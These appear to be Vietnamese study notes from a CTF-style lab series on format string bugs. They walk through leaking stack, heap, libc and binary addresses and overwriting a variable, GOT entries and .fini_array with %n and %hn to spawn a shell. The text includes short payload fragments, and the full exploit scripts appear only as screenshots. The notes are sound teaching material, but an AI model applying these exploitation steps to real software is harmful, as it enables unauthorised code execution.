# FORMAT STRING
## Khái niệm 
Source: https://youtu.be/b8GMf5kM2LU?si=CJeDrYdz5ugZhW46  
-Lỗi format string xảy ra khi mà chương trình truyền trực tiếp dữ liệu đầu vào của người dùng vào các hàm in (`printf`) mà không dùng chuỗi định dạng cố định
-VÍ DỤ  
```
char buf[100];
fgets(buf, sizeof(buf), stdin);
printf(buf);      -> lỗi 
```
-> Thông thường khi in sẽ viết là `printf("%s", buf);` -> có định dạng là %s  

### Các loại Format (Định dạng)
- `%p` in ra địa chỉ con trỏ dưới dạng hex
- `%x` in ra số nguyên 32 bit (unsigned int) dạng hex  
- `%lx`  in ra số nguyên 64 bit (unsigned long) dạng hex
- `%d` in ra số nguyên có dấu 32 bit (signed int) dạng dec
- `%ld` in ra số nguyên có dấu 32 bit (signed int) dạng dec
- `%u` in số nguyên không dấu (unsigned int) dạng dec  
- `%c` in ra 1 ký tự (1 byte) dựa teho ASCII
- `%s` in ra chuỗi dữ liệu đến khi gặp null byte `(\x00)`. Nó sẽ truy cập vào địa chỉ đang chứa dữ liệu và in ra dữ liệu
- `%n` không in ra, nhưng nó sẽ đếm số byte được in ra trước nó và truyền vào biến tương ứng

### Cơ chế printf 
- 32 bit: In trên stack
- 64 bit: 5 format đầu sẽ được đưa vào 5 thanh ghi theo thứ tự: RSI, RDX, RCX, R8, R9. (RDI chứa chuỗi printf). Từ format thứ 6 sẽ là dữ liệu trên Stack.

### Leak Stack Memory 
- Vì `%p` là in địa chỉ con trỏ trỏ tới dữ liệu. Nên khi `printf("%p")`, nó sẽ in ra địa chỉ con trỏ(% đầu tiên thì sẽ là địa chỉ bên trong rsi). Mình có thể truyền nhiều `%p`.
- `%s` sẽ trỏ tới vị trí chứa địa chỉ HỢP LỆ để đọc chuỗi ký tự tại đó. 

### Ghi đè dữ liệu 
- `%n` sẽ ghi đè số byte đếm được vào địa chỉ trỏ tới. Mà `%c` lại lấy đúng duy nhất 1 byte -> mình có thể viết 1 hoặc 1 chuỗi `%c` trước `%n`, khi printf thì `%n` sẽ đếm số byte (số lần `%c`) và ghi đè dữ liệu tại vị trí tương ứng
- Padding: nếu minh muốn đếm 18 byte thì mình có thể viết là `%18c`. 
Ví dụ mình muốn ghi đè vào [rsp+16] thì mình sẽ `printf("%c%c%c%c%c%c%n")`
- Mình có thể in nhanh `%p` thứ 8 thay vì viết 8 lần %p, bằng cách `printf("%8$p")`
- Mình cũng có thể điều khiển `%n` ghi vào thứ tự nào, ví dụ `printf("%28c%8$n")` -> ghi 28 vào % thứ 8

## FMTSTR 1 - Leak dữ liệu bằng %p
Source: https://youtu.be/Vkv3s-_DYnM?si=tvlficM9LUUChxON  

<img width="1067" height="717" alt="Screenshot 2026-11-08 180713" src="https://github.com/user-attachments/assets/bf929cce-b115-4c18-9fa0-a3374f7d9dcf" />

- Mình chạy file và đi tới hàm open(), nó sẽ mở file flag.txt đọc dữ liệu vào. Khi chạy đến hàm printf(), dữ liệu đó đã được đưa lên Stack


<img width="1608" height="833" alt="Screenshot 2026-11-09 163443" src="https://github.com/user-attachments/assets/6d2f4c35-5852-4b99-af48-fd027296aea0" />

- Kiểm tra Stack thì chuỗi Flag nằm ở vị trí % thứ 12 trở đi
- Có 2 cách để mình leak ra:
- Cách 1 là chạy chương trình và nhập thủ công từng %, sau đó chuyển hết về đúng dạng

<img width="920" height="467" alt="Screenshot 2026-11-09 164133" src="https://github.com/user-attachments/assets/2c720dc5-fdd3-4033-8d6c-8eb9a478eb7c" />

- Cách 2 là viết Script

  <img width="655" height="381" alt="Screenshot 2026-11-09 164725" src="https://github.com/user-attachments/assets/0dc8d71d-2cea-4423-b6da-bc5ea94e0b75" />

- Do chương trình chỉ có 1 lần nhập nên mình sẽ chạy 1 vòng lặp chạy lại chạy chương trình để tự động nhập
- Vì in byte ra lúc chạy script nhìn khá rối nên mình sẽ tạo 1 biến flag để lưu
- Mình sẽ nhận hết các byte leak ra và đưa vào output, sau đó nối vào flag thành chuỗi, khi output có byte '}' thì sẽ in ra chuỗi flag và dừng vòng lặp. 

## FMTSTR 2 - Leak dữ liệu bằng %s
Source: https://youtu.be/jsnxpBg2y28?si=3OtvWY0qnObCns0x  

<img width="1687" height="832" alt="Screenshot 2026-11-09 175239" src="https://github.com/user-attachments/assets/47622486-b404-42b4-ad06-2a8fa7269e46" />

- Vì flag lần này được read vào buf nằm ở vùng Heap chứ không phải Stack, thứ nằm trên Stack sẽ là địa chỉ vùng Heap đang chứa flag, nên nếu dùng %p thì thứ mình leak được là địa chỉ heap chứ không phải flag.

<img width="1408" height="638" alt="Screenshot 2026-11-09 180240" src="https://github.com/user-attachments/assets/9600add2-a33f-4400-914d-d0a6b87a140a" />

- Sử dụng %s thay vì in ra dữ liệu là địa chỉ heap, thì sẽ sẽ truy cập vào địa chỉ đó và in ra dữ liệu trong đó (hiểu đơn giản %p in ra cha, %s in ra con) 

<img width="546" height="180" alt="Screenshot 2026-11-09 181134" src="https://github.com/user-attachments/assets/abe63c0c-e740-4533-b1e4-e2c1ea01e0e4" />

<img width="970" height="153" alt="Screenshot 2026-11-09 181209" src="https://github.com/user-attachments/assets/ed633d6b-cd87-4594-9cf4-6414bd34f368" />

- Vì %s in ra đến khi nào gặp null byte, nên việc flag không có null byte bên trong thì khá dễ để leak vì nó in ra hết được 
- Nhập thẳng trong lúc chạy chương trình hoặc trên gdb sẽ nhanh hơn thay vì viết Script cho bài này
## FMTSTR 3 - Leak dữ liệu kết hợp %p và %s
Source: https://youtu.be/WXBnSjwfcBw?si=od5CRzN7H9gGwgV_
<img width="1457" height="652" alt="Screenshot 2026-11-10 153316" src="https://github.com/user-attachments/assets/5b2fc771-d4ae-4544-a367-8af01f0fbf1e" />
<img width="486" height="246" alt="Screenshot 2026-11-10 153731" src="https://github.com/user-attachments/assets/5932c295-ba1d-4ba5-a856-07a32b4c6cc7" />

- Trong bài này, flag được đọc 1 nửa vào con trỏ flag1 và nửa còn lại vào global var flag2.
- Có 2 lỗi Format String và không có BOF
  
<img width="1192" height="492" alt="Screenshot 2026-11-10 160729" src="https://github.com/user-attachments/assets/2142ae33-d6b3-4ee5-9dd1-3a93521c9763" />
<img width="288" height="70" alt="Screenshot 2026-11-10 161116" src="https://github.com/user-attachments/assets/d4fade8c-e741-4be1-a20f-660dcbabbb10" />

- Nửa đầu flag thì mình còn có thể dùng %s để leak do nằm trên Stack. Do PIE đang bật nên nửa còn lại thì buộc minh phải leak địa chỉ binary.

<img width="1831" height="637" alt="Screenshot 2026-11-10 163124" src="https://github.com/user-attachments/assets/042e9a69-2bbe-4822-b300-8259364d331d" />

- Mình có 1 địa chỉ binary của chương trình nằm ở saved-rip, mình có thể tel và đếm. Hoặc có cách tính nhanh:
```
(Địa chỉ muốn lấy - địa chỉ rsp)/8 + 6
```

<img width="847" height="357" alt="Screenshot 2026-11-10 185455" src="https://github.com/user-attachments/assets/f705584c-82f8-44d3-9305-e14f7d174670" />


<img width="1542" height="872" alt="Screenshot 2026-11-10 174058" src="https://github.com/user-attachments/assets/69fea46b-50e4-4ca8-b5c9-b78745a55bf2" />


- Mình sử dụng debug động để thao tác nhanh hơn thay vì attach thủ công
- Mình tính địa chỉ binary leak được trừ đi binary base và ra được offset của base (đang debug gdb nên dùng địa chỉ tĩnh cho dễ)
- Có được địa chỉ rồi thì mình chỉ cần tính offset từ base đến flag2, rồi lấy base cộng offset đấy là ra được địa chỉ chính xác của flag2

<img width="1172" height="692" alt="Screenshot 2026-11-10 182416" src="https://github.com/user-attachments/assets/632ef7c0-d2e9-44f6-9c41-35570f60f4f6" />

- Tại sao mình phải thêm 3 byte rác vào payload? Do lúc chạy có 1 vấn đề xảy ra

<img width="1482" height="832" alt="Screenshot 2026-11-10 183051" src="https://github.com/user-attachments/assets/88d40c7e-93fa-4c55-bf73-feb9ffcd62ce" />

- Địa chỉ của flag2 đang nằm không đúng vị trí, nói chính xác thì một nửa đang nằm ở trên, một nửa đang nằm ở dưới. Thứ nhất nó sẽ sai địa chỉ flag2 là điều chắc chắn, thứ 2 là %s cần 1 địa chỉ hợp lệ để trỏ tới, nhưng cả 2 cái đều không phải địa chỉ hợp lệ, chính vì thế khi gửi payload, mình phải kẹp thêm trước địa chỉ flag2 3 byte rác để địa chỉ flag2 nằm đúng vị trí

## FMTSTR 4 - Format String & Bof
- Soucre: https://youtu.be/Q0SPwsxW_-s?si=EeKamsD8MVKaOk54
<img width="1361" height="798" alt="Screenshot 2026-11-11 143141" src="https://github.com/user-attachments/assets/796cc1dd-2d19-43ed-9470-f2ea4a2ad8ed" />

<img width="703" height="271" alt="Screenshot 2026-11-11 143153" src="https://github.com/user-attachments/assets/2b26d54c-fcc1-41d1-8c77-57e6f30e3571" />

- Bài này có 2 lỗi Format String và Buffer Overflow. Lỗi Format String nằm ở biến ID, hàm stringcompare chỉ so sánh 11 byte đầu xem có giống không. Thế nên mình có thể tận dụng để leak địa chỉ Canary và thậm chí là địa chỉ binary

<img width="447" height="66" alt="Screenshot 2026-11-11 152252" src="https://github.com/user-attachments/assets/64ddecde-cb6f-42a2-8408-4d8481cce777" />

<img width="878" height="156" alt="Screenshot 2026-11-11 152219" src="https://github.com/user-attachments/assets/ec57352d-5f0a-40f5-aceb-9bf8d5aaf553" />

- Mình đã thành công Leak Canary và địa chỉ libc (mình định dùng ROPchain nhưng lúc ghi đè chỉ ghi được tới saved-rip là tối đa).

<img width="521" height="132" alt="Screenshot 2026-11-11 152533" src="https://github.com/user-attachments/assets/7bee0aff-b341-471c-9bef-f705e2d22fc5" />
<img width="1920" height="1080" alt="Screenshot (130)" src="https://github.com/user-attachments/assets/9e115f75-7eb4-4040-959b-e3cf1d5ad74b" />

- Lần recv thứ nhất sẽ nhận cho tới byte '9', nên lần recv thứ 2 sẽ nhận từ byte 0x của canary đến byte 'Enter ', mình bỏ Enter đi là được chuỗi canary và địa chỉ Libc
- Sau đó mình dùng split để chia ra, nó được chia ra thành 1 mảng có 3 phần tử
- Leak được địa chỉ libc rồi mình sẽ tính offser từ libc base tới địa chỉ đó. Rồi lấy địa chỉ đó trừ ngược lại là ra được chính xác libc.address

<img width="1527" height="615" alt="Screenshot 2026-11-11 175041" src="https://github.com/user-attachments/assets/631dd1cd-7df8-48e8-9b83-270a9524c965" />


- Mình sẽ dùng 1 công cụ là one_gadget để tự động tìm trong libc các địa chỉ offset tạo shell
- Mỗi cái đều có điều kiện riêng, ví dụ cái đầu tiên con của r15 bằng null hoặc r15 bằng null và con của r12 bằng null hoặc r12 bằng null.

<img width="1541" height="832" alt="Screenshot 2026-11-11 172552" src="https://github.com/user-attachments/assets/83ef5abd-2647-43f6-8e1f-a2dc6d2c96dd" />

- Như mình check thì thấy điều kiện thỏa rồi. Còn để mà check con thì mình dùng x/xg. Nếu mà không thỏa điều kiện, mình gọi vẫn được nhưng nó sẽ không tạo shell

<img width="905" height="342" alt="Screenshot 2026-11-11 173545" src="https://github.com/user-attachments/assets/cdf00a87-e44b-4e04-bdd3-96b298daf46c" />
<img width="957" height="832" alt="Screenshot 2026-11-11 174101" src="https://github.com/user-attachments/assets/259ede75-e682-4de3-933a-908c5bd7b0ad" />
<img width="443" height="197" alt="Screenshot 2026-11-11 175339" src="https://github.com/user-attachments/assets/afc7ddad-d71d-4555-96cf-bccc2b3990db" />

- Mình tính offset từ buf đến rip, và xem khi return thì thanh ghi có thỏa điều kiện không. -> Có
- Nên lần payload mình cứ gửi byte rác đến canary thì ghi đè, byte rác cho rbp và ghi đè địa chỉ nhảy đến gadget vào rip. (Khi dùng one_gadget thì nó sẽ cho mình offset từ libc base đến gadget đó, do địa chỉ động nên mình phải cộng thêm địa chỉ libc base mới ra đúng địa chỉ one_gadget)

### Final Script
<img width="553" height="918" alt="Screenshot 2026-11-11 180021" src="https://github.com/user-attachments/assets/a659d48a-6c80-415b-b08c-bbe769a5e259" />

## FMTSTR 5 - Ghi đè dữ liệu bằng %n
<img width="720" height="457" alt="Screenshot 2026-11-12 101739" src="https://github.com/user-attachments/assets/77394502-6ae2-4846-8078-cb9a49fde7e7" />

- Trong bài này, mình chỉ cần ghi đè được biến check thành 0xdeadbeef là lấy được shell. Mình sẽ dùng %n, %n sẽ đếm số byyte được in ra trước nó và ghi đè giá trị mà con trỏ đang trỏ vào.

<img width="701" height="105" alt="Screenshot 2026-11-12 110915" src="https://github.com/user-attachments/assets/ca6d6a3b-9f4c-4368-89d3-8ce311084540" />

- Biến check hiện tại đang là 0, và quan trọng, địa chỉ check vẫn chưa có trên Stack, nên mình phải đưa địa chỉ check lên Stack. Sau đó chạy thử chương trình để xem chính xác địa chỉ biến check nằm ở vị trí nào rồi mới để %n trỏ vào 

<img width="432" height="102" alt="Screenshot 2026-11-12 114952" src="https://github.com/user-attachments/assets/e572b1c2-c9a0-48c3-97af-5dd66bf1d48e" />
<img width="952" height="126" alt="Screenshot 2026-11-12 115013" src="https://github.com/user-attachments/assets/651a9dea-1d00-4c43-b39b-beeb07085093" />

- Mình để %n trỏ tạm vào %6 và chạy thử chương trình, lúc này mình nhận thấy rằng địa chỉ check đang dính với %6$n, nó tạo thành 1 địa chỉ không hợp lệ để mà %n ghi vào. Thế nên mình cần tách địa chỉ check ra bằng cách thêm byte rác cho đủ 8 byte của %6$n.

<img width="452" height="121" alt="Screenshot 2026-11-12 115851" src="https://github.com/user-attachments/assets/162a6a39-1bd8-41e5-b12d-1530c1961e23" />

<img width="888" height="150" alt="Screenshot 2026-11-12 115903" src="https://github.com/user-attachments/assets/81973654-b9c5-4452-8af9-7e74d371881f" />

- Địa chỉ biến check đã được tách ra và gdb cũng nhận biết được địa chỉ biến check
- Nhưng mục tiêu của mình là phải ghi đè 0xdeadbeef vào check, mình sẽ sử dụng %c

<img width="536" height="128" alt="Screenshot 2026-11-12 123849" src="https://github.com/user-attachments/assets/ef031d38-55b7-4e61-80b7-882a78ab80b7" />


- Mình sẽ dùng f để đưa 0xdeadbeef vào.
- Mình cần phải chừa thêm 1 khoảng dành cho Format String, vì Format String của mình có thể sẽ thay đổi tiếp, có thể lùi ra lùi vào và làm thay đổi địa chỉ check
- Mình chừa ra 0x20 byte rồi địa check nằm ở đâu thì mình thay đổi padding là được. -> đảm bảo được địa chỉ check vẫn giữ nguyên trên 1 hàng

<img width="835" height="848" alt="Screenshot 2026-11-12 124200" src="https://github.com/user-attachments/assets/ddf73b6d-6411-4996-9b85-e9d340d4ad8f" />

<img width="431" height="160" alt="Screenshot 2026-11-12 131202" src="https://github.com/user-attachments/assets/87dbdd71-0d54-4ff2-acaa-6cb83d9bf9fa" />

<img width="921" height="206" alt="Screenshot 2026-11-12 131253" src="https://github.com/user-attachments/assets/d9bc3905-639d-49d6-8091-5d7ccad57476" />

- Nhưng vì {0xdeadbeef} quá lớn nên printf không xử lý được, nên mình sẽ in trước 2 byte {0xbeef} 
- Giờ mình sẽ nối chuỗi còn lại {0xdead} vào trong địa chỉ check

<img width="536" height="157" alt="Screenshot 2026-11-12 131156" src="https://github.com/user-attachments/assets/421e5f19-a5bf-461a-ae9d-f01a8f6161d0" />

<img width="557" height="205" alt="Screenshot 2026-11-12 133206" src="https://github.com/user-attachments/assets/ee4d1fce-5a12-4b4b-95d6-ba77145dc4f2" />


- Để ghi {0xdead} vào thì mình phải cộng địa chỉ lên 2 byte, khi cộng lên nó sẽ trỏ đúng vị trí để %n ghi đè vào
- Còn 1 vấn đề nữa cần lưu ý, %n sẽ ghi vào số byte nó đếm được khi in ra trước nó, mà trước đó mình đã in ra 0xbeef rồi thì tức là lần này nếu ghi mỗi f'%{0xdead}%11$n' thôi thì nó ghi đếm luôn cả 0xbeef và 0xdead cộng vào rồi ghi vô. Nên mình cần trừ đi 0xbeef trước đó đã ghi để %n ghi chính xác vào (hoặc mình có thể dùng %hn để chỉ định ghi đúng số byte) 

### Final Script
<img width="675" height="577" alt="Screenshot 2026-11-12 133111" src="https://github.com/user-attachments/assets/49a3b49b-f30a-49ba-901f-b2fb514caf27" />

## FMTSTR 6 - Tấn công GOT 
Source: https://youtu.be/ZosW20QjET8?si=Js2CTy5OQO2r1X4u
<img width="743" height="305" alt="Screenshot 2026-11-12 173636" src="https://github.com/user-attachments/assets/46b3ef31-9566-4cf5-8510-1d3eaaf749f6" />
<img width="795" height="282" alt="Screenshot 2026-11-12 173623" src="https://github.com/user-attachments/assets/d2a9a19f-fb61-4ef9-afb1-96712833160b" />

- Trong bài này chỉ có lỗi Format String, và địa chỉ là địa chỉ động nên mình phải leak địa chỉ. Và bài này có vòng lặp cho phép mình nhập liên tục nhiều lần.

<img width="1462" height="410" alt="Screenshot 2026-11-12 175137" src="https://github.com/user-attachments/assets/8a4fd66f-8756-45b9-a73f-ae3d62c07721" />

- Do RELRO tắt nên mình có thể tận dụng khả năng RW- của GOT 
- Mình có thể ghi đè địa chỉ các hàm trong GOT, ví dụ mình ghi đè địa chỉ printf() địa chỉ hàm system(), thì sau khi thay đổi printf() khi chạy chương trình nó sẽ biến thành system()

<img width="538" height="115" alt="Screenshot 2026-11-12 181430" src="https://github.com/user-attachments/assets/82baa10b-c18c-44c9-8408-ba3a174bfe2f" />
<img width="520" height="125" alt="Screenshot 2026-11-12 180640" src="https://github.com/user-attachments/assets/984cc6bc-9cc8-418a-803d-01337557f422" />

- Đầu tiên mình sẽ leak libc address trước
- Mình cũng sẽ chạy file buildnstart.sh trong docker mà anh Trí đã cho sẵn để lấy đúng phiên bản libc. Do trong thực tế thì local libc của mình sẽ khác với libc trên server
- Vì địa chỉ libc sẽ khác 3 byte cuối theo mỗi phiên bản (ví dụ của mình là 601 thì có chạy bao nhiêu lần nó vẫn là 601), mà địa chỉ khác nhau sẽ khiến offset cũng khác nhau.

<img width="676" height="546" alt="Screenshot 2026-11-14 111448" src="https://github.com/user-attachments/assets/7ce9da00-4479-4bc3-87e3-95646ca0dedc" />

<img width="800" height="123" alt="Screenshot 2026-11-14 111504" src="https://github.com/user-attachments/assets/7cc74c36-f999-4683-866f-524cf29dab54" />

- Mình đã kết nối server và địa chỉ libc leak được ra với 3 byte cuối là 023

<img width="1192" height="642" alt="Screenshot 2026-11-14 112621" src="https://github.com/user-attachments/assets/2a0756e6-a471-4027-b7e4-a5228afd08e4" />
<img width="1882" height="270" alt="Screenshot 2026-11-14 112908" src="https://github.com/user-attachments/assets/b9aa0853-e202-4172-84f7-d5285e5e9cfd" />


- Mình lên libc.rip để tải phiên bản phù hợp có đuôi 023, mình phải thử từng libc. Mình sẽ chọn phiên bản cuối, copy linl và wget để tải về cho nhanh, sau đó pwninit 

<img width="732" height="572" alt="Screenshot 2026-11-14 113513" src="https://github.com/user-attachments/assets/927b0cc5-5f67-4ce0-a158-2cb9ecf91be4" />

<img width="1878" height="308" alt="Screenshot 2026-11-14 113503" src="https://github.com/user-attachments/assets/cd72ff81-be2d-4a0b-bf61-98c6657fb814" />


- Rồi mình đưa libc lên, chạy local thì đuôi __libc_start_main_ret đax thành 023 chứ không phải 601 như lúc đầu -> giờ mình đã có thể khai thác đúng offset tính địa chỉ libc base 

<img width="663" height="147" alt="Screenshot 2026-11-14 114326" src="https://github.com/user-attachments/assets/c9afbac9-9166-454c-96b8-fad75947f615" />

<img width="466" height="67" alt="Screenshot 2026-11-14 114318" src="https://github.com/user-attachments/assets/42460054-407c-47f6-b595-5155e90359cd" />

- Bây giờ, do chương trình chạy liên tục ở hàm main và không return, nên việc overwrite rip và vô nghĩa 

<img width="438" height="151" alt="Screenshot 2026-11-14 114620" src="https://github.com/user-attachments/assets/a3dca944-9868-48ad-9760-7043843cd7f5" />

- RELRO tắt và mình có thể ghi đè GOT, quan trọng bây giờ mình phải ghi đè system() lên fgets() hay printf(). Mình muốn thực thi system() với argument đầu tiên là chuỗi `/bin/sh` thì mình phải chọn hàm nào có argument đầu tiên mình điều khiển được
- Mà GOT mình tấn công là của binary, nên mình phải leak binary ra  

<img width="955" height="563" alt="Screenshot 2026-11-14 115801" src="https://github.com/user-attachments/assets/1ad5896a-e815-4e05-ba73-a743a42b1679" />

- Các địa chỉ màu đỏ thường là địa chỉ binary của chương trình. Nhưng mấy địa chỉ xuất hiện trên Stack này thường là địa chỉ rác, mình cần kiểm tra thử và kiếm thêm địa chỉ khác nếu sai, địa chỉ binary trên local chưa chắc đã giống khi chạy trên server. Mình sẽ chọn thử địa chỉ có đuôi 2cd 

<img width="1092" height="482" alt="Screenshot 2026-11-14 120417" src="https://github.com/user-attachments/assets/65cb9b3a-6d53-499e-ad3f-c8a50abca1f3" />

- Chạy trên server và đúng i chang địa chỉ binary mình chạy trên local -> dùng được địa chỉ này để tính offset binary base
<img width="431" height="95" alt="Screenshot 2026-11-14 130111" src="https://github.com/user-attachments/assets/7964baa3-a24b-4415-aa4c-261272151210" />

<img width="925" height="242" alt="Screenshot 2026-11-14 130118" src="https://github.com/user-attachments/assets/12f8b9cb-2b8a-40ab-a2b8-df9aed4adbcb" />

- NOTE: Địa chỉ base là số không âm và 3 ký tự cuối là 000

<img width="1142" height="535" alt="Screenshot 2026-11-14 131427" src="https://github.com/user-attachments/assets/b7046294-e0f7-4491-942b-0b5f9e3f0693" />

- Giờ mình sẽ đến bước ghi đè system, mình cần tìm sự tương quan giữa printf() và system(), ở đây khác nhau 3 byte cuối thì mình chỉ cần ghi đè 3 byte cuối, không cần phải ghi đè hết
- Ở đây ghi đè 3 byte thì mình sẽ ghi đè 1 byte trước rồi mới ghi đè 2 byte, không ghi 2 byte rồi đến 1 vì sẽ dẫn tới lỗi

<img width="462" height="127" alt="Screenshot 2026-11-14 163637" src="https://github.com/user-attachments/assets/814a0100-5762-44f6-b97e-894bd52cb6c5" />

- Đầu tiên mình lấy 1 byte đầu của địa chỉ system gắn làm part 1. Part 2 thì lấy 2 byte tiếp theo nhưng sẽ dịch vào 8 bit(1 byte đã lấy). 

<img width="540" height="323" alt="Screenshot 2026-11-14 163901" src="https://github.com/user-attachments/assets/305b9868-6d64-4e86-9bd5-ca31a827be57" />

- Sau đó khai thác như bài trước đó, sử dụng %hn. Đưa %hn lên trước, sau đó chừa 1 khoảng ra và đưa địa chỉ printf() lên. Sau khi ghi đè hàm system() lên hàm printf(), mình chỉ gần gửi chuỗi `/bin/sh\0` ở hàm fgets(), thì xuống dưới system() thực thi là mình có được shell 

### Final Script

<img width="612" height="882" alt="Screenshot 2026-11-14 164738" src="https://github.com/user-attachments/assets/57ed046f-d808-4901-92dd-f70da645dd33" />

## FMTSTR 7 - Định dạng con  "*"
<img width="747" height="572" alt="Screenshot 2026-11-23 110846" src="https://github.com/user-attachments/assets/266bb226-9409-401d-b431-03fb861e8847" />
<img width="755" height="263" alt="Screenshot 2026-11-23 113423" src="https://github.com/user-attachments/assets/f45e2be7-3949-41b4-80c4-bd1f222b5940" />



- Trong bài này thì chỉ có 1 lỗi Format String duy nhất, mình cần dùng gdb để xem chương trình chạy thế nào và có thể khai thác ở đâu

<img width="1287" height="852" alt="Screenshot 2026-11-23 113409" src="https://github.com/user-attachments/assets/8f1bcc90-a1b4-4bc4-a0bc-68969bcd520a" />
<img width="1206" height="167" alt="Screenshot 2026-11-23 113214" src="https://github.com/user-attachments/assets/7532810a-b039-464d-9724-fb892e5ef44b" />


- Chạy đến memset của content thì mình thấy là tại địa chỉ Stack đang chứa 1 địa chỉ binary, mà biến content lại nằm ngay dưới biến title, tức chỉ cần ghi đủ biến title thì printf(%s) của title sẽ nối chuỗi và in luôn ra địa chỉ binary 

<img width="1902" height="857" alt="Screenshot 2026-11-23 132853" src="https://github.com/user-attachments/assets/34fdbbfd-4082-40ed-b2c5-d1d496f2c2fd" />
<img width="507" height="57" alt="Screenshot 2026-11-23 133619" src="https://github.com/user-attachments/assets/8ca38e6c-7f7c-4952-abad-28fe47d9c9d2" />

- Mình đã leak được binary. Lưu ý là do địa chỉ động nên random nó có thể xuất hiện byte null bên trong địa chỉ dẫn đến việc dừng in, nên mình cần chạy lại nhiều lần nếu gặp trường hợp đó. 
- Bài này không có BOF nên cũng không còn leak thêm được gì

<img width="452" height="577" alt="Screenshot 2026-11-23 134549" src="https://github.com/user-attachments/assets/e300ec3c-3c58-4aba-8288-2a3eead52d77" />

<img width="463" height="192" alt="Screenshot 2026-11-23 134725" src="https://github.com/user-attachments/assets/9340d224-1668-4460-9275-b0cf0c3139e3" />


- Mình quan sát thì thấy được là có hàm get_shell(), nếu truy cập vào được thì mình sẽ thực thi được system(/bin/sh)
- Vì RELRO tắt nên mình có thể overwrite GOT được, bên dưới lỗi Format String thì có hàm exit(), mình có thể tận dụng ghi đè hàm exit() bằng hàm get_shell()

<img width="1015" height="633" alt="Screenshot 2026-11-23 141308" src="https://github.com/user-attachments/assets/e9c5bf04-3a0b-430c-92de-2f16eea0ac70" />
- Do chỉ khác nhau 2 byte nên mình sẽ ghi đè 1 lần 2 byte luôn
- Nhưng do là địa chỉ động nên mình cần phải brute-force, do 1 lần mình chỉ ghi đè có 2 byte
- Hoặc còn 1 cách khác, đó là sử dụng toán tử con "*". Ví dụ khi chạy chương trình, địa chỉ ngẫu nhiên, nhưng mình có thể ghi được chính xác 2 byte dù bị random

### Toán tử con * trong Format String 
<img width="236" height="125" alt="Screenshot 2026-11-23 143102" src="https://github.com/user-attachments/assets/eac2d6d6-cbe4-43ac-ba6e-931f3c76bf1f" />
<img width="830" height="95" alt="Screenshot 2026-11-23 143322" src="https://github.com/user-attachments/assets/e05a65d4-f885-442c-b471-b71b8c5e7dce" />

- Con * nó sẽ trỏ tới chính xác số lượng byte được chỉ định, ví dụ ở đây là 10 byte thì nó sẽ trỏ đúng số lượng 10 byte (bao gồm cả biến a là 2 byte) và rồi in ra 10 byte đó bằng %d.

### Tiếp tục khai thác
<img width="472" height="445" alt="Screenshot 2026-11-23 144909" src="https://github.com/user-attachments/assets/aeab8210-80a2-4742-af76-868d94a8a6e6" />

<img width="1172" height="736" alt="Screenshot 2026-11-23 150132" src="https://github.com/user-attachments/assets/5f01c081-da6e-4e04-87cd-e7e94d293223" />

- Đây là khi mình chỉ nhập %$c thông thường, mặc dù nó trỏ tới vị trí %14 nhưng nó sẽ không in đúng 0xb2b7 mà chỉ lấy đúng số lượng 1 byte cuối là 0xb7 thôi. Vì thế mình cần thêm con * vào để padding chính xác số lượng byte cần lấy và ghi.

<img width="426" height="435" alt="Screenshot 2026-11-23 150906" src="https://github.com/user-attachments/assets/8027ca71-7e13-4d1c-a188-59b20a0ffa36" />
<img width="1916" height="992" alt="Screenshot 2026-11-23 150652" src="https://github.com/user-attachments/assets/e61260f4-7f6d-433d-8f93-f824b94c5d06" />

- Đây là khi mình thêm %* vào thì nó sẽ lấy đúng số lượng byte và in ra các byte rỗng để %n ghi đè đúng số lượng byte vào địa chỉ exit()

### Final Script
<img width="527" height="825" alt="Screenshot 2026-11-23 151736" src="https://github.com/user-attachments/assets/d190e779-dd6d-459e-99e5-9d18972b02f4" />

## FMTSTR 8 - Khai thác .fini_array

<img width="825" height="666" alt="Screenshot 2026-11-23 162140" src="https://github.com/user-attachments/assets/6e217e2b-5304-4b05-a1f9-6d23db0f42c6" />

<img width="522" height="185" alt="Screenshot 2026-11-23 162155" src="https://github.com/user-attachments/assets/919fdcae-3759-4796-86c8-fa02d4913352" />

- Bài này mình có thể nhập 3 lần và đồng nghĩa với 3 lần Format String. Chỉ cần nhập 1 lý tự khác y và Y là quay lại vòng lặp. Giờ mình cần phải vào gdb xem có gì để khai thác được 

<img width="1526" height="482" alt="Screenshot 2026-11-23 175906" src="https://github.com/user-attachments/assets/c7efb4d2-b3b4-41a3-b47a-28fd1e345fce" />

- Kiểm tra Stack bài này, có 1 địa chỉ đặc biệt, nó gần giống địa chỉ libc nhưng không phải, và nó đang trỏ tới 1 địa chỉ base binary

<img width="942" height="297" alt="Screenshot 2026-11-23 180957" src="https://github.com/user-attachments/assets/6469ad3f-883e-40ed-ab0d-23987bf5738a" />
<img width="756" height="55" alt="Screenshot 2026-11-23 180739" src="https://github.com/user-attachments/assets/9be1a2f7-d35f-4743-bbb6-ecc60f5e33ba" />

- Dùng lệnh info files để kiểm tra, có 1 địa chỉ là .fini_arry, đây là 1 mảng gồm khoảng 1-2 phần tử, khi kết thúc chương trình, thực hiện exit, chương trình sẽ thực thi địa chỉ .fini_array. Nhưng địa chỉ .fini_array đó không phải là cố định, khi exit, chương trình sẽ lấy địa chỉ base cộng với 1 offset nhất định để ra được đúng địa chỉ .fini_array

### Khai thác
- Lúc nãy mình thấy là trên Stack có 1 con trỏ trỏ tới địa chỉ base, mà từ base cộng với offset sẽ ra được .fini_array. Vậy nếu mình thay đổi được địa chỉ mà con trỏ đó trỏ tới (base) thành địa chỉ khác thì lúc kết thúc và exit nó sẽ lấy địa chỉ khác đó cộng với offset và thực thi dữ liệu khác (không còn thực thi dữ liệu của .fini_array)

- -> Mục tiêu lúc này sẽ là thay đổi được địa chỉ con trỏ trỏ tới

<img width="880" height="150" alt="Screenshot 2026-11-23 183837" src="https://github.com/user-attachments/assets/9ca1ce26-d61d-4413-b824-ad8d8526b6fe" />

- Trong chương trình mình có luôn hàm get_shell() để lấy shell
- Vậy giờ mình sẽ cần leak địa chỉ binary

<img width="930" height="987" alt="Screenshot 2026-11-23 205107" src="https://github.com/user-attachments/assets/15e9f722-4e3b-4ee8-be83-f94c922c5b02" />

- Sau khi leak được base address, mình kiểm tra vùng rw- của binary thì thấy chỗ này đang khá trống chỉ có stdin, stdout.

<img width="1595" height="741" alt="Screenshot 2026-11-23 212708" src="https://github.com/user-attachments/assets/374b9ad2-da4f-4885-927d-41318e14006f" />

- Mình sẽ chọn 1 vùng trống nằm trong phần rw- của binary để đưa get_shell() vào, sau đó tính offset từ base tới đó.

